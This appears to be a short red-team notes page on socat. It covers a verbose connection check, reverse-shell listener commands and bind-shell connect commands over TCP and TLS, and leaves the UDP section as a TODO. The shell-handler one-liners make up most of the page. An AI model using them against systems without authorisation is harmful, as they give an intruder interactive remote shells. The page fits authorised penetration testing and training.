---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - cross-platform
  - socat
---
# Socat

Checking a remote connection with verbosed debug.

```
$ socat -dddd - tcp4:<remote_IP>:<remote_PORT>
```

> [!NOTE]
> Using root privileges to bind a listener to ports below 1024.

## 01 - Reverse Shell Handler

### 1.1 - TCP Method

```
$ socat file:`tty`,raw,echo=0 tcp-listen:<PORT>

$ socat -d -d tcp4-listen:443 STDOUT
```

## 02 - Bind Shell Handler

### 2.1 - TCP Method

```
$ socat file:`tty`,raw,echo=0 tcp:<target_IP>:<target_PORT>
```

### 2.2 - UDP Method

TODO: Make another shell handler for UDP

### 2.3 - TLS Method

```
$ socat - OPENSSL:<target_IP>:<target_PORT>,verify=0
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Implant/Cross Platform/Payloads/One-Liners/Socat]]